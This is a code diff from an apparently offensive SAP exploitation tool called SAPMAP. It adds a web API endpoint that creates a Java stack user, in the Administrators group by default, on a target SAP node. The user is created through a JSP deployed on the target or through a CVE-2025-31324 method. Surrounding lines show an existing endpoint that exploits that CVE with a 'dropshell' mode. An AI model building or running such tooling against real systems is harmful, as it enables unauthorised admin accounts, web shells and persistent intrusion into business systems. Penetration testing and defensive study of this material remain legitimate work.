@@ -1250,6 +1250,37 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:check_cve_31324", "Check CVE-2025-31324", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/create_user_java", method="POST")
+    def node_create_user_java(sid):
+        """Create a Java stack user via the UME API exposed by a deployed JSP.
+
+        Body: {username, password, group?, method? = "auto"|"cve_31324"|"gw"}
+        Responds synchronously with the CreatedUser result (or error).
+        """
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+        sys_type = (node.system_type or "").upper()
+        if "JAVA" not in sys_type:
+            return json.dumps({"error": "Not a Java / dual-stack system"})
+
+        username = (data.get("username") or "SAPMAP00").strip()
+        password = (data.get("password") or "").strip()
+        group    = (data.get("group") or "Administrators").strip()
+        method   = (data.get("method") or "auto").strip()
+
+        def _run():
+            created = sapmap_exploit.create_user_java(
+                node, api.state, username=username, password=password,
+                group=group, method=method)
+            if created:
+                api.state.track_created_user(created)
+
+        _bg(f"{sid}:create_user_java", "Create Java User", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/exploit_cve_2025_31324", method="POST")
     def node_exploit_cve_2025_31324(sid):
         """Exploit CVE-2025-31324.  mode: "command" (default) | "dropshell".
